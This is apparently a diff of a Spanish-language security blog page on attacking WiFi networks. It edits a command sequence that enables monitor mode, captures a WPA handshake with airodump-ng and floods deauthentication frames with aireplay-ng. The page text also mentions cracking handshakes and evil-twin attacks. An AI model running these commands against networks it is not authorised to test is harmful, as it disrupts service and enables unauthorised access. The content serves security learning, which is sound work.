@@ -33,7 +33,7 @@ sudo su export AIRGEDDON_WINDOWS_HANDLING=tmux airgeddon Más info acá: https:/
 sudo wifite sudo airgeddon Podés capturar el handshare y intentar romperlo usando diccionarios, fuerza bruta con airgeddon, creando gemelo malvado. Podes crear diccionarios específicos así:">
   <meta itemprop="datePublished" content="2024-07-21T19:48:09-03:00">
   <meta itemprop="dateModified" content="2024-07-21T19:48:09-03:00">
-  <meta itemprop="wordCount" content="4016">
+  <meta itemprop="wordCount" content="4029">
   <meta itemprop="keywords" content="Atacando,Redes,Ciberseguridad,Vulnerabilidades">
   
   <meta name="twitter:card" content="summary">
@@ -733,8 +733,8 @@ grep -E &#39;^[^0-9]*([0-9]){4}$&#39; sanchez_dicc1 &gt; sanchez_dicc2
 </span></span><span style="display:flex;"><span>airmon-ng check kill
 </span></span><span style="display:flex;"><span>airmon-ng start wlp1s0
 </span></span><span style="display:flex;"><span>airodump-ng wlp1s0
-</span></span><span style="display:flex;"><span>sudo airodump-ng -w wificapture -c 11 --bssid ... wlp1s0 # wificapture para capturar el handshake
-</span></span><span style="display:flex;"><span>sudo aireplay-ng --deauth 0 -a BSSID_NETWORK wlp1s0
+</span></span><span style="display:flex;"><span>sudo airodump-ng -w wificapture -c NUMERO_CANAL --bssid ... wlp1s0 # wificapture para capturar el handshake
+</span></span><span style="display:flex;"><span>sudo aireplay-ng -D --deauth 0 -a BSSID_NETWORK wlp1s0 # Si no pones el cliente tenes que agregar la opcion -D
 </span></span><span style="display:flex;"><span>wireshark wificapture-01.cap
 </span></span><span style="display:flex;"><span>sudo airmon-ng stop wlp1s0 
 </span></span></code></pre></div><h3 id="wifite">wifite</h3>
